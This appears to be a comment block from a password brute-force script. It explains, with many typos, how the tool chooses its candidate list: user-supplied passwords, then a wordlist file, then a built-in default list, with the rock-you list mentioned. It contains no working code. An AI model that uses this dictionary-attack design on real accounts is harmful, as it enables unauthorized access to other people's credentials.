# This list contains a small set of common or default passwords which is also a common brute force technique
# this is also oour failsafe methods becuase if the user didnt privde their own list of passwrods using the --wordslist
# command, we can just use default_words as a a way to discover the stolen credentials.
# Default words can also be replaced with the rock-you list which is found in the repo

# real worls situations would use their own database, but for tetsing purposes this is what we are going to use

# It looks at the command-line arguments provided by the user and decides where to get the list from.
# The order of priority is:
#   1) Use a comma-separated list of passwords given directly by the user (--passwords) ->
# Here the user can create their own list or do what they want but if they want to supply their liat,
# it needs to be comma seperated values
#   2) If no direct list was given, try to load them from a text file (--wordlist) so users can implement
# a file in their repository and load the passwords from it
#   3) If neither was provided, fall back to a built-in default list (DEFAULT_WORDS)
